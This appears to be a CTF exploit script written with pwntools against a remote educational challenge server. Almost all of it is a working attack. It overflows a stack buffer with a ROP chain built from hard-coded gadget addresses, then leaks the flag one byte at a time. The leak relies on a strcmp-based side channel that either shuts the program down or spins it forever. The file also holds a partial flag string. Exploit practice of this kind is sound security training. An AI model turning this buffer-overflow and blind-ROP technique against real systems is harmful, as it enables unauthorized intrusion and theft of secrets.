from pwn import *
import time
import string
# p = remote('edu-ctf.zoolab.org', 10012)


context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

rbp = 0x411740

add_rax_rdx_ret = 0x00000000004106bf
ebfe = 0x0000000000403a8d
pop_rdi_ret = 0x0000000000401812
pop_rsi_ret = 0x0000000000402798
pop_rdx_ret = 0x000000000040171f
pop_rax_ret = 0x0000000000458237

mov_byte_rdi_from_dl_ret = 0x0000000000442c53
strcmp_pop5reg_ret= 0x0000000000485307
movbyte_rdi_rsi_ret = 0x0000000000454aa0
clean_qword_rax8_ret = 0x0000000000427114


printable = [ord(i) for i in string.printable]
flag = "FLAG{CORORO_f8b7d5d23ad03512d6687384b7"
for i in range(len(flag), 50):
    for byte in printable:
        p = remote('edu-ctf.zoolab.org', 10012)
        # p = process('./chal')
        print(flag, chr(byte))
        flagAddress = 0x4de2e0+i
        guessByte = flagAddress + 0x50



        ROP = flat(
            #clean guess string
            pop_rax_ret, guessByte-8,
            clean_qword_rax8_ret,

            #clean flag string
            pop_rax_ret, flagAddress-8+1,
            clean_qword_rax8_ret,

            #set guessByte(rdi) as my input
            pop_rdi_ret, guessByte,
            pop_rdx_ret, p64(byte),
            mov_byte_rdi_from_dl_ret,

            #set rsi as flag and strcmp, if equal shutdown, else sleep forever
            pop_rsi_ret, flagAddress,
            strcmp_pop5reg_ret, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef, ebfe
        )


        # gdb.attach(p,
        # """
        # b *main
        # """
        # )

        payload = b'a' * 0x20 + b'b' * 8 + ROP
        p.sendafter(b' rop\n', payload)
        time.sleep(0.2)
        try:
            print(p.recv(timeout=3))
            flag += chr(byte)
            break
        except Exception as e:
            print(e)







